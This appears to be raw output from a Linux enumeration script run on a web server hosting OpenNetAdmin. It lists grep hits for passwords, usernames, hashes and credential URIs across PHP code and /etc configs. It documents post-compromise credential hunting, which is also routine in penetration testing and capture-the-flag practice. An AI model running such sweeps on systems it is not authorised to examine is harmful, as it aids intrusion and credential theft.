+/var/www/html/ona/include/adodb5/drivers/adodb-ado.inc.php:	function _connect($argHostname, $argUsername, $argPassword, $argProvider= 'MSDASQL')
+/var/www/html/ona/include/adodb5/drivers/adodb-ado.inc.php:	function _pconnect($argHostname, $argUsername, $argPassword, $argProvider='MSDASQL')
+/var/www/html/ona/include/adodb5/drivers/adodb-ado5.inc.php:		if ($argPassword)$argHostname .= ";$p=$argPassword";
+/var/www/html/ona/include/adodb5/drivers/adodb-ado5.inc.php:	function _pconnect($argHostname, $argUsername, $argPassword, $argProvider='MSDASQL')
+/var/www/html/ona/include/adodb5/drivers/adodb-ldap.inc.php:	var $password = false;
+/var/www/html/ona/include/adodb5/drivers/adodb-mssqlnative.inc.php:		$connectionInfo["PWD"]=$argPassword;
+/var/www/html/ona/include/adodb5/drivers/adodb-mysqli.inc.php:				$argPassword = NULL,
+/var/www/html/ona/include/adodb5/drivers/adodb-odbtp.inc.php:		if ($argPassword && stripos($UserOrDSN,'DRIVER=') !== false) {
+/var/www/html/ona/include/adodb5/drivers/adodb-odbtp.inc.php:	function _pconnect($HostOrInterface, $UserOrDSN='', $argPassword='', $argDatabase='')
+/var/www/html/ona/include/adodb5/drivers/adodb-odbtp.inc.php:    function _connect($HostOrInterface, $UserOrDSN='', $argPassword='', $argDatabase='')
+/var/www/html/ona/include/adodb5/drivers/adodb-oracle.inc.php:		function _connect($argHostname, $argUsername, $argPassword, $argDatabasename, $mode=0)
+/var/www/html/ona/include/adodb5/drivers/adodb-pdo.inc.php:	function _connect($argDSN, $argUsername, $argPassword, $argDatabasename, $persist=false)
+/var/www/html/ona/include/adodb5/drivers/adodb-postgres64.inc.php:			$pwd = adodb_addslashes($pwd);
+/var/www/html/ona/include/adodb5/drivers/adodb-postgres64.inc.php:			if ($pwd)  $str .= " password=".$pwd;
+/var/www/html/ona/include/adodb5/drivers/adodb-postgres64.inc.php:		//if ($user) $linea = "user=$user host=$linea password=$pwd dbname=$db port=5432";
+/var/www/html/ona/include/adodb5/drivers/adodb-postgres64.inc.php:	// 	$db->Connect("host=host1 user=user1 password=secret port=4341");
+/var/www/html/ona/include/adodb5/drivers/adodb-postgres64.inc.php:	// 	$db->PConnect("host=host1 user=user1 password=secret port=4341");
+
+[+] Finding possible password variables inside key folders (limit 70)
+/var/www/html/ona/include/functions_db.inc.php:        $self['db_database'] = $db['db_database'];
+/var/www/html/ona/include/functions_db.inc.php:        $self['db_host']     = $db['db_host'];
+/var/www/html/ona/include/html_desktop.inc.php:                           accesskey="q"
+/var/www/html/ona/local/config/database_settings.inc.php:        'db_database' => 'ona_default',
+/var/www/html/ona/local/config/database_settings.inc.php:        'db_host' => 'localhost',
+/var/www/html/ona/login.php:                            style="width: 100px; font-size: 8pt;" type="text" maxlength="64" tabindex="1" accesskey="u"
+/var/www/html/ona/modules/ona/domain.inc.php:                'admin_email'     => $admin,
+/var/www/html/ona/winc/app_advanced_search.inc.php:            <input id="domain" name="domain" type="text" class="edit" size="35" accesskey="z" />
+/var/www/html/ona/winc/app_advanced_search.inc.php:            <input id="ip" name="ip" type="text" class="edit" size="15" accesskey="i" />
+/var/www/html/ona/winc/app_advanced_search.inc.php:            <input id="location" class="edit" type="text" name="location" size="8" accesskey="l" />
+/var/www/html/ona/winc/app_advanced_search.inc.php:            <input id="mac" name="mac" type="text" class="edit" size="17" accesskey="m" />
+/var/www/html/ona/winc/app_advanced_search.inc.php:            <input id="notes" name="notes" type="text" class="edit" size="17" accesskey="n" />
+/var/www/html/ona/winc/app_advanced_search.inc.php:            <input id="vlan" name="vlandesc" type="text" class="edit" size="32" accesskey="v" />
+/var/www/html/ona/winc/app_advanced_search.inc.php:            <select id="manufacturer" name="manufacturer" class="edit" accesskey="u">
+/var/www/html/ona/winc/app_advanced_search.inc.php:            <select id="model" name="model" class="edit" accesskey="l">
+/var/www/html/ona/winc/app_advanced_search.inc.php:            <select id="nettype" name="nettype" class="edit" accesskey="u" accesskey="t" >
+/var/www/html/ona/winc/app_advanced_search.inc.php:            <select id="role" name="role" class="edit" accesskey="t">
+/var/www/html/ona/winc/app_config_type_edit.inc.php:                    accesskey=" "
+/var/www/html/ona/winc/app_custom_attribute_type_edit.inc.php:                    accesskey=" "
+/var/www/html/ona/winc/app_device_model_edit.inc.php:                    accesskey=" "
+/var/www/html/ona/winc/app_device_model_edit.inc.php:                <select id="manufacturer_id" name="manufacturer_id" class="edit" accesskey="m">
+/var/www/html/ona/winc/app_device_role_edit.inc.php:                    accesskey=" "
+/var/www/html/ona/winc/app_device_type_edit.inc.php:                    accesskey=" "
+/var/www/html/ona/winc/app_device_type_edit.inc.php:                <select id="model_id" name="model_id" class="edit" accesskey="m">
+/var/www/html/ona/winc/app_device_type_edit.inc.php:                <select id="role_id" name="role_id" class="edit" accesskey="r">
+/var/www/html/ona/winc/app_dhcp_option_edit.inc.php:                    accesskey=" "
+/var/www/html/ona/winc/app_dhcp_option_edit.inc.php:                <select id="type" name="type" class="edit" accesskey="t">
+/var/www/html/ona/winc/app_dns_view_edit.inc.php:                    accesskey=" "
+/var/www/html/ona/winc/app_group_edit.inc.php:                    accesskey=" "
+/var/www/html/ona/winc/app_manufacturer_edit.inc.php:                    accesskey=" "
+/var/www/html/ona/winc/app_subnet_type_edit.inc.php:                    accesskey=" "
+/var/www/html/ona/winc/app_sysconf_edit.inc.php:                    accesskey=" "
+/var/www/html/ona/winc/app_user_edit.inc.php:                    accesskey=" "
+/var/www/html/ona/winc/edit_block.inc.php:                    accesskey=" "
+/var/www/html/ona/winc/edit_custom_attribute.inc.php:                    accesskey=" "
+/var/www/html/ona/winc/edit_custom_attribute.inc.php:                <select id="type" name="type" class="edit" accesskey="t">
+/var/www/html/ona/winc/edit_dhcp_failover_group.inc.php:                    accesskey=" "
+/var/www/html/ona/winc/edit_dhcp_option_entry.inc.php:                    accesskey=" "
+/var/www/html/ona/winc/edit_dhcp_option_entry.inc.php:                <select id="option" name="option" class="edit" accesskey="l">
+/var/www/html/ona/winc/edit_dhcp_pool.inc.php:                    accesskey=" "
+/var/www/html/ona/winc/edit_dhcp_server.inc.php:                    accesskey=" "
+/var/www/html/ona/winc/edit_domain.inc.php:                    accesskey=" "
+/var/www/html/ona/winc/edit_domain.inc.php:        $domain['admin_email'] = $conf['dns_admin_email'];
+/var/www/html/ona/winc/edit_domain_server.inc.php:                    accesskey=" "
+/var/www/html/ona/winc/edit_host.inc.php:                    accesskey=" "
+/var/www/html/ona/winc/edit_interface.inc.php:                    accesskey=" "
+/var/www/html/ona/winc/edit_location.inc.php:                    accesskey=" "
+/var/www/html/ona/winc/edit_record.inc.php:                    accesskey=" "
+/var/www/html/ona/winc/edit_subnet.inc.php:                    accesskey=" "
+/var/www/html/ona/winc/edit_subnet.inc.php:                <select name="set_type" class="edit" accesskey="t">
+/var/www/html/ona/winc/edit_vlan.inc.php:                    accesskey=" "
+/var/www/html/ona/winc/edit_vlan_campus.inc.php:                    accesskey=" "
+/var/www/html/ona/winc/search_results.inc.php:            <select id="dns_view" name="dns_view" class="edit" accesskey="v" >
+/var/www/html/ona/winc/search_results.inc.php:            <select id="dnstype" name="dnstype" class="edit" accesskey="u" >
+/var/www/html/ona/winc/search_results.inc.php:            <select id="nettype" name="nettype" class="edit" accesskey="u" accesskey="t" >
+/var/www/html/ona/winc/tooltips.inc.php:                   accesskey="a"
+/var/www/html/ona/winc/tooltips.inc.php:             <input name="name" type="text" class="edit" size="32" accesskey="n" />
+/var/www/html/ona/winc/tooltips.inc.php:             <input name="reference" type="text" class="edit" size="32" accesskey="r" />
+/var/www/html/ona/winc/tooltips.inc.php:            <input id="ip_subnet_qf" name="ip_subnet" class="edit" type="text" size="15" accesskey="i" />
+/var/www/html/ona/winc/tooltips.inc.php:            <input id="subnet_qf" name="netdesc" type="text" class="edit" size="32" accesskey="d" />
+/var/www/html/ona/winc/tooltips.inc.php:            <input name="address" type="text" class="edit" size="32" accesskey="a" />
+/var/www/html/ona/winc/tooltips.inc.php:            <input name="city" class="edit" type="text" size="20" accesskey="c" />&nbsp;
+/var/www/html/ona/winc/tooltips.inc.php:            <input name="name" type="text" class="edit" size="24" accesskey="n" />
+/var/www/html/ona/winc/tooltips.inc.php:            <input name="zip" class="edit" type="text" size="10" maxlength="10" accesskey="z" />
+/var/www/html/ona/winc/tooltips.inc.php:            <select id="nettype" name="nettype" class="edit" accesskey="u" accesskey="t" >
+/var/www/html/ona/winc/user_edit.inc.php:                'client_id'   => $_SESSION['auth']['client']['id'],
+/var/www/html/ona/winc/user_list.inc.php:    $where = "`client_id` = {$_SESSION['auth']['client']['id']} AND `active` = 1";
+/var/www/html/sierra/vendors/revolution/php/flickr/class-flickr.php:		  'api_key' => $this->api_key,
+/var/www/html/sierra/vendors/revolution/php/flickr/class-flickr.php:		$this->api_key = $api_key;
+/var/www/html/sierra/vendors/revolution/php/instagram/class-instagram.php:		$this->api_key = $api_key;
+
+[+] Finding possible password in config files
+ /etc/sysctl.d/10-ptrace.conf
+credentials that exist in memory (re-using existing SSH connections,
+ /etc/apache2/apache2.conf
+passwd files from being
+ /etc/debconf.conf
+passwords.
+password
+passwords.
+passwords
+password
+passwords.dat
+passwords and one for everything else.
+passwords
+password is really
+Passwd: secret
+ /etc/adduser.conf
+passwd
+ /etc/overlayroot.conf
+password is randomly generated
+password will be stored for recovery in
+passwd
+password,mkfs=0
+PASSWORD="foobar"
+PASSWORD" |
+PASSWORD" |
+PASSWORD HERE IN THIS CLEARTEXT CONFIGURATION
+passwords are more secure, but you won't be able to
+passwords are generated by calculating the sha512sum
+ /etc/nsswitch.conf
+passwd:         compat systemd
+
+[+] Finding 'username' string inside key folders (limit 70)
+/var/www/html/artwork/prepros-6.config:      "username": "",
+/var/www/html/marga/prepros-6.config:      "username": "",
+/var/www/html/ona/dcm.php:    $DCMUSER=$_SESSION['ona']['auth']['user']['username']=$_SERVER['PHP_AUTH_USER'];
+/var/www/html/ona/dcm.php:    $_SESSION['ona']['auth']['user']['username']='dcm.pl';
+/var/www/html/ona/include/adodb/adodb-pear.inc.php:				$parsed['username'] = urldecode($str);
+/var/www/html/ona/include/adodb/adodb-pear.inc.php:				$parsed['username'] = urldecode(substr($str, 0, $pos));
+/var/www/html/ona/include/adodb/adodb-pear.inc.php:			'username' => false,
+/var/www/html/ona/include/adodb/adodb-pear.inc.php:		// $dsn => username:password@protocol+hostspec/database
+/var/www/html/ona/include/adodb/adodb-pear.inc.php:	 *  phptype(dbsyntax)://username:password@protocol+hostspec/database
+/var/www/html/ona/include/adodb/adodb-pear.inc.php:	 *  phptype://username:password@hostspec
+/var/www/html/ona/include/adodb/adodb-pear.inc.php:	 *  phptype://username:password@hostspec/database_name
+/var/www/html/ona/include/adodb/adodb-pear.inc.php:	 *  phptype://username:password@protocol+hostspec:110//usr/db_file.db
+/var/www/html/ona/include/adodb/adodb-pear.inc.php:	 *  username: User name for login
+/var/www/html/ona/include/adodb/adodb.inc.php:		if ($argUsername != "") {
+/var/www/html/ona/include/adodb/adodb.inc.php:	 *  username: User name for login
+/var/www/html/ona/include/adodb/adodb.inc.php:	function NConnect($argHostname = "", $argUsername = "", $argPassword = "", $argDatabaseName = "") {
+/var/www/html/ona/include/adodb/adodb.inc.php:	function PConnect($argHostname = "", $argUsername = "", $argPassword = "", $argDatabaseName = "") {
+/var/www/html/ona/include/adodb/drivers/adodb-ado.inc.php:			if (!$argUsername) $argHostname .= ";Trusted_Connection=Yes";
+/var/www/html/ona/include/adodb/drivers/adodb-ado.inc.php:		if ($argUsername) $argHostname .= ";$u=$argUsername";
+/var/www/html/ona/include/adodb/drivers/adodb-ado.inc.php:	function _connect($argHostname, $argUsername, $argPassword, $argProvider= 'MSDASQL')
+/var/www/html/ona/include/adodb/drivers/adodb-ado.inc.php:	function _pconnect($argHostname, $argUsername, $argPassword, $argProvider='MSDASQL')
+/var/www/html/ona/include/adodb/drivers/adodb-ado5.inc.php:			if (!$argUsername) $argHostname .= ";Trusted_Connection=Yes";
+/var/www/html/ona/include/adodb/drivers/adodb-ado5.inc.php:		if ($argUsername) $argHostname .= ";$u=$argUsername";
+/var/www/html/ona/include/adodb/drivers/adodb-ado5.inc.php:	function _pconnect($argHostname, $argUsername, $argPassword, $argProvider='MSDASQL')
+/var/www/html/ona/include/adodb/drivers/adodb-ads.inc.php:  //  print "dsn=$argDSN u=$argUsername p=$argPassword<br>"; flush();
+/var/www/html/ona/include/adodb/drivers/adodb-ldap.inc.php:			$username = 'anonymous';
+/var/www/html/ona/include/adodb/drivers/adodb-ldap.inc.php:	var $username = false;
+/var/www/html/ona/include/adodb/drivers/adodb-mysqli.inc.php:				$argUsername = NULL,
+/var/www/html/ona/include/adodb/drivers/adodb-odbc.inc.php:	//	print "dsn=$argDSN u=$argUsername p=$argPassword<br>"; flush();
+/var/www/html/ona/include/adodb/drivers/adodb-oracle.inc.php:			if ($argDatabasename) $argUsername .= "@$argDatabasename";
+/var/www/html/ona/include/adodb/drivers/adodb-oracle.inc.php:		function _connect($argHostname, $argUsername, $argPassword, $argDatabasename, $mode=0)
+/var/www/html/ona/include/adodb/drivers/adodb-pdo.inc.php:	function _connect($argDSN, $argUsername, $argPassword, $argDatabasename, $persist=false)
+/var/www/html/ona/include/adodb5/adodb-pear.inc.php:				$parsed['username'] = urldecode($str);
+/var/www/html/ona/include/adodb5/adodb-pear.inc.php:				$parsed['username'] = urldecode(substr($str, 0, $pos));
+/var/www/html/ona/include/adodb5/adodb-pear.inc.php:			'username' => false,
+/var/www/html/ona/include/adodb5/adodb-pear.inc.php:		// $dsn => username:password@protocol+hostspec/database
+/var/www/html/ona/include/adodb5/adodb-pear.inc.php:	 *  phptype(dbsyntax)://username:password@protocol+hostspec/database
+/var/www/html/ona/include/adodb5/adodb-pear.inc.php:	 *  phptype://username:password@hostspec
+/var/www/html/ona/include/adodb5/adodb-pear.inc.php:	 *  phptype://username:password@hostspec/database_name
+/var/www/html/ona/include/adodb5/adodb-pear.inc.php:	 *  phptype://username:password@protocol+hostspec:110//usr/db_file.db
+/var/www/html/ona/include/adodb5/adodb-pear.inc.php:	 *  username: User name for login
+/var/www/html/ona/include/adodb5/adodb.inc.php:		if ($argUsername != "") {
+/var/www/html/ona/include/adodb5/adodb.inc.php:	 *  username: User name for login
+/var/www/html/ona/include/adodb5/adodb.inc.php:	function NConnect($argHostname = "", $argUsername = "", $argPassword = "", $argDatabaseName = "") {
+/var/www/html/ona/include/adodb5/adodb.inc.php:	function PConnect($argHostname = "", $argUsername = "", $argPassword = "", $argDatabaseName = "") {
+/var/www/html/ona/include/adodb5/drivers/adodb-ado.inc.php:			if (!$argUsername) $argHostname .= ";Trusted_Connection=Yes";
+/var/www/html/ona/include/adodb5/drivers/adodb-ado.inc.php:		if ($argUsername) $argHostname .= ";$u=$argUsername";
+/var/www/html/ona/include/adodb5/drivers/adodb-ado.inc.php:	function _connect($argHostname, $argUsername, $argPassword, $argProvider= 'MSDASQL')
+/var/www/html/ona/include/adodb5/drivers/adodb-ado.inc.php:	function _pconnect($argHostname, $argUsername, $argPassword, $argProvider='MSDASQL')
+/var/www/html/ona/include/adodb5/drivers/adodb-ado5.inc.php:			if (!$argUsername) $argHostname .= ";Trusted_Connection=Yes";
+/var/www/html/ona/include/adodb5/drivers/adodb-ado5.inc.php:		if ($argUsername) $argHostname .= ";$u=$argUsername";
+/var/www/html/ona/include/adodb5/drivers/adodb-ado5.inc.php:	function _pconnect($argHostname, $argUsername, $argPassword, $argProvider='MSDASQL')
+/var/www/html/ona/include/adodb5/drivers/adodb-ads.inc.php:  //  print "dsn=$argDSN u=$argUsername p=$argPassword<br>"; flush();
+/var/www/html/ona/include/adodb5/drivers/adodb-ldap.inc.php:			$username = 'anonymous';
+/var/www/html/ona/include/adodb5/drivers/adodb-ldap.inc.php:	var $username = false;
+/var/www/html/ona/include/adodb5/drivers/adodb-mysqli.inc.php:				$argUsername = NULL,
+/var/www/html/ona/include/adodb5/drivers/adodb-odbc.inc.php:	//	print "dsn=$argDSN u=$argUsername p=$argPassword<br>"; flush();
+/var/www/html/ona/include/adodb5/drivers/adodb-oracle.inc.php:			if ($argDatabasename) $argUsername .= "@$argDatabasename";
+/var/www/html/ona/include/adodb5/drivers/adodb-oracle.inc.php:		function _connect($argHostname, $argUsername, $argPassword, $argDatabasename, $mode=0)
+/var/www/html/ona/include/adodb5/drivers/adodb-pdo.inc.php:	function _connect($argDSN, $argUsername, $argPassword, $argDatabasename, $persist=false)
+/var/www/html/ona/include/auth/ldap.class.php:        $info['username']   = $user;
+/var/www/html/ona/include/functions_general.inc.php:            $_SESSION['ona']['auth']['user']['username'] = $matches[1];
+/var/www/html/ona/include/functions_general.inc.php:            $username = "anonymous";
+/var/www/html/ona/include/functions_general.inc.php:            $username = $_SESSION['ona']['auth']['user']['username'];
+/var/www/html/ona/include/functions_general.inc.php:        $username = "anonymous";
+/var/www/html/ona/include/functions_general.inc.php:        $username = $_SESSION['ona']['auth']['user']['username'];
+/var/www/html/ona/include/functions_general.inc.php:        if (preg_match('/unix_username=([^&]+?)(&|$)/', $_REQUEST['options'], $matches)) {
+/var/www/html/ona/include/xajax_setup.inc.php:function get_username_suggestions($q, $max_results=10) {
+/var/www/html/ona/index.php:    $_SESSION['ona']['auth']['user']['username'] = 'guest';
+/var/www/html/ona/modules/mysql_purge_logs.inc.php:    user=NAME                 mysql username (default: root)
+
+[+] Searching specific hashes inside files - less false positives (limit 70)
+
+[+] Searching md5/sha1/sha256/sha512 hashes inside files (limit 50)
+/etc/popularity-contest.conf:"d087905aa4da40cb87ec26d5760e808c"
+/etc/machine-id:44bf1480ab2c456192be5f80ba18261f
+/etc/grub.d/05_debian_theme:648ee65dd0c157a69b019a5372cbcfea4fc754a5 
+/var/backups/dpkg.status.0: 36de53e7c2d968f951b11c64be101b91
+
+[+] Finding URIs with user:password@host inside key folders
+/var/www/html/ona/include/adodb/adodb-pear.inc.php:	 *  phptype(dbsyntax)://username:password@protocol+hostspec/database
+/var/www/html/ona/include/adodb/adodb-pear.inc.php:	 *  phptype://username:password@hostspec
+/var/www/html/ona/include/adodb/adodb-pear.inc.php:	 *  phptype://username:password@hostspec/database_name
+/var/www/html/ona/include/adodb/adodb-pear.inc.php:	 *  phptype://username:password@protocol+hostspec:110//usr/db_file.db
+/var/www/html/ona/include/adodb5/adodb-pear.inc.php:	 *  phptype(dbsyntax)://username:password@protocol+hostspec/database
+/var/www/html/ona/include/adodb5/adodb-pear.inc.php:	 *  phptype://username:password@hostspec
+/var/www/html/ona/include/adodb5/adodb-pear.inc.php:	 *  phptype://username:password@hostspec/database_name
+/var/www/html/ona/include/adodb5/adodb-pear.inc.php:	 *  phptype://username:password@protocol+hostspec:110//usr/db_file.db
+/var/www/ona/include/adodb/adodb-pear.inc.php:	 *  phptype(dbsyntax)://username:password@protocol+hostspec/database
+/var/www/ona/include/adodb/adodb-pear.inc.php:	 *  phptype://username:password@hostspec
+/var/www/ona/include/adodb/adodb-pear.inc.php:	 *  phptype://username:password@hostspec/database_name
+/var/www/ona/include/adodb/adodb-pear.inc.php:	 *  phptype://username:password@protocol+hostspec:110//usr/db_file.db
+/var/www/ona/include/adodb5/adodb-pear.inc.php:	 *  phptype(dbsyntax)://username:password@protocol+hostspec/database
+/var/www/ona/include/adodb5/adodb-pear.inc.php:	 *  phptype://username:password@hostspec
+/var/www/ona/include/adodb5/adodb-pear.inc.php:	 *  phptype://username:password@hostspec/database_name
+/var/www/ona/include/adodb5/adodb-pear.inc.php:	 *  phptype://username:password@protocol+hostspec:110//usr/db_file.db
